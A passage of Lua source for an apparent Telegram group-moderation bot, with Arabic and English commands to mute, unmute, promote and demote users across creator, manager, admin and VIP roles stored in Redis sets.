Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ is already muted ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم  (كتمه ) سابقا*', 1, 'md')
end
end
DevAbs:sadd(DevProx..'bot:muted:'..msg.chat_id_, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، ??\n🚸┇ has been muted ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم  (كتمه ) بنجاح*', 1, 'md')
end
end
end
end
------------------------------------DevProx-----------------------------------------------------------
local text = msg.content_.text_:gsub('الغاء كتم','Unmuteuser')
if text:match("^[Uu]nmuteuser$") and msg.reply_to_message_id_ ~= 0 then
function unmute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:muted:'..msg.chat_id_
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ not muted ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *لم يتم ( كتمه ) سابقا*', 1, 'md')
end
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been unmuted ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المكتوم* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم  ( الغاء كتمه ) بنجاح*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
end
------------------------------------DevProx-----------------------------------------------------------
if text:match("^[Uu]nmuteuser @(.*)$") then
local ap = {string.match(text, "^([Uu]nmuteuser) @(.*)$")}
function unmute_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if not DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_, result.id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ not muted ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '??┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *لم يتم ( كتمه ) سابقا*', 1, 'md')
end
else
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_, result.id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ has been unmuted ✅ \nֆ                 ֆ*'
else
text = '🏆┇ المكتوم ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم ( الغاء كتمه ) بنجاح'
end
end
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '*🚸┇ Username is not correct *'
else
text = '*🚸┇ المعرف غير صحيح *'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],unmute_by_username)
end
---------------------------------DevProx--------------------------------------------------------------
if text:match("^[Uu]nmuteuser (%d+)$") then
local ap = {string.match(text, "^([Uu]nmuteuser) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if not DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_, ap[2]) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ not muted ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *لم يتم ( كتمه ) سابقا*', 1, 'md')
end
else
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been unmuted ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المكتوم* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم  ( الغاء كتمه ) بنجاح*', 1, 'md')
end
end
end
end
end 
------------
if is_admin(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^رفع منشئ$") then 
function setmonsh_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:monsh:'..msg.chat_id_
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is now monsh ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( منشئ ) سابقا*', 1, 'md')
end
else
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been monsh ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( منشئ ) بنجاح*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,setmonsh_by_reply)
end
end
--------------------------------------------DevProx---------------------------------------------------
--------------------------------------------DevProx---------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^رفع منشئ @(.*)$") then
local ap = {string.match(text, "^(رفع منشئ) @(.*)$")}
function setmonsh_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
DevAbs:sadd(DevProx..'bot:monsh:'..msg.chat_id_, result.id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ added to monsh list ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ العضو ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم رفعه ( منشئ ) بنجاح'
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end 
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],setmonsh_by_username)
end
end
--------------------------------------DevProx---------------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رفع منشئ (%d+)$") then
local ap = {string.match(text, "^(رفع منشئ) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
DevAbs:sadd(DevProx..'bot:monsh:'..msg.chat_id_, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been monsh ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( منشئ ) بنجاح*', 1, 'md')
end
end
end
end 
----------------------------------------DevProx-------------------------------------------------------
if is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^تنزيل منشئ$") then
function demonsh_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:monsh:'..msg.chat_id_
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is not a monsh ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *لم يتم رفعه ( منشئ ) سابقا*', 1, 'md')
end
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The monsh ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ removed from monsh list ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم تنزيله من ( قائمه المنشئين )*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demonsh_by_reply)
end 
end
----------------------------------------DevProx-------------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تنزيل منشئ @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local abs = 'bot:monsh:'..msg.chat_id_
local ap = {string.match(text, "^(تنزيل منشئ) @(.*)$")}
function remmonsh_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ was demoted ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ العضو ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم تنزيله من ( قائمه المنشئين )'
end
DevAbs:srem(DevProx..abs, result.id_)
else
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],remmonsh_by_username)
end end
----------------------------------------------DevProx-------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تنزيل منشئ (%d+)$") then
local abs = 'bot:monsh:'..msg.chat_id_
local ap = {string.match(text, "^(تنزيل منشئ) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
DevAbs:srem(DevProx..abs, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The monsh ؛ '..ap[2]..' ، 🚷\n🚸┇ removed from monsh list ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله من ( قائمه المنشئين )*', 1, 'md')
end
end
end
end
-------------------------------DevProx-------------------
if is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^رفع مدير عام$") then
function setownerall_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:onall:'
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n⏱┇ is now onwer all✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( مدير عام ) سابقا*', 1, 'md')
end
else
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been onwer all ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( مدير عام ) بنجاح*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,setownerall_by_reply)
end
end
--------------------------------------------DevProx---------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^رفع مدير عام @(.*)$") then
local ap = {string.match(text, "^(رفع مدير عام) @(.*)$")}
function setownerall_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
DevAbs:sadd(DevProx..'bot:onall:', result.id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ added to owner all list ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ العضو ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم رفعه ( مدير عام ) بنجاح'
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],setownerall_by_username)
end
end
--------------------------------------DevProx---------------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رفع مدير عام (%d+)$") then
local ap = {string.match(text, "^(رفع مدير عام) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
DevAbs:sadd(DevProx..'bot:onall:', ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been onwer all ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( مدير عام ) بنجاح*', 1, 'md')
end
end
end
end
----------------------------------------DevProx-------------------------------------------------------
if is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^تنزيل مدير عام$") then
function deownerall_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:onall:'
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is not a owner all ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *لم يتم رفعه ( مدير عام ) سابقا*', 1, 'md')
end
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The Owner ؛ '..result.sender_user_id_..' ، ??\n🚸┇ removed from owner all list ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله من ( قائمه المدراء العامين )*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,deownerall_by_reply)
end
end
----------------------------------------DevProx-------------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تنزيل مدير عام @(.*)$") then
local abs = 'bot:onall:'
local ap = {string.match(text, "^(تنزيل مدير عام) @(.*)$")}
function remownerall_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
DevAbs:srem(DevProx..abs, result.id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The Owner all ؛ '..result.id_..' ، 🚷\n🚸┇ removed from owner all list ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ العضو ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم تنزيله من ( قائمه المدراء العامين )'
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],remownerall_by_username)
end
end
----------------------------------------------DevProx-------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تنزيل مدير عام (%d+)$") then
local abs = 'bot:onall:'
local ap = {string.match(text, "^(تنزيل مدير عام) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
DevAbs:srem(DevProx..abs, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The Owner all ؛ '..ap[2]..' ، 🚷\n🚸┇ removed from owner all list ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله من ( قائمه المدراء العامين )*', 1, 'md')
end
end
end
end 
------------------------------------------DevProx-----------------------------------------------------
if is_onall(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0  then
if text:match("^رفع ادمن عام$") then
function promoteall_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:moall:'
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is now a moderator all ✅ \nֆ                 ֆ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( ادمن عام ) سابقا*', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been promote all ✅ \nֆ                 ֆ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( ادمن عام ) بنجاح*', 1, 'md')
end
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promoteall_by_reply)
end
end
-----------------------------------------DevProx------------------------------------------------------
if is_onall(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رفع ادمن عام @(.*)$") then
local ap = {string.match(text, "^(رفع ادمن عام) @(.*)$")}
function promoteall_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ promoted to moderator all ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ العضو ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم رفعه ( ادمن عام ) بنجاح'
end
DevAbs:sadd(DevProx..'bot:moall:', result.id_)
else
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],promoteall_by_username)
end
 end
-------------------------------------DevProx----------------------------------------------------------
if is_onall(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رفع ادمن عام (%d+)$") then
local ap = {string.match(text, "^(رفع ادمن عام) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been promote all✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( ادمن عام ) بنجاح*', 1, 'md')
end
end
DevAbs:sadd(DevProx..'bot:moall:', ap[2])
end
-----------------------------------------DevProx------------------------------------------------------
if text:match("^تنزيل ادمن عام$") then
function demoteall_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:moall:'
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is not promote all✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *لم يتم رفعه ( ادمن عام ) سابقا*', 1, 'md')
end
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ was removed from promoted all ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله من ( قائمه الادمن العام )*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demoteall_by_reply)
end
-------------------------------------------DevProx----------------------------------------------------
if text:match("^تنزيل ادمن عام @(.*)$") then
local abs = 'bot:moall:'
local ap = {string.match(text, "^([Dd]emoteall) @(.*)$")}
function demoteall_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ was demoted all ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ الادمن العام ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم تنزيله ( عضو ) بنجاح'
end
DevAbs:srem(DevProx..abs, result.id_)
else
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],demoteall_by_username)
end
------------------------------------------DevProx-----------------------------------------------------
if text:match("^تنزيل ادمن عام (%d+)$") then
local abs = 'bot:moall:'
local ap = {string.match(text, "^(تنزيل ادمن عام) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..ap[2]..' ، 🚷\n🚸┇ was demoted all ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *الادمن العام* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله ( عضو ) بنجاح*', 1, 'md')
end
end
DevAbs:srem(DevProx..abs, ap[2])
end
end
------------------------------------------DevProx-----------------------------------------------------
if is_moall(msg.sender_user_id_, msg.chat_id_) then
local text = msg.content_.text_:gsub('رفع مميز عام','Setvipall')
if text:match("^[Ss]etvipall$") and msg.reply_to_message_id_ ~= 0  then
function promoteall_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:vpall:'
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
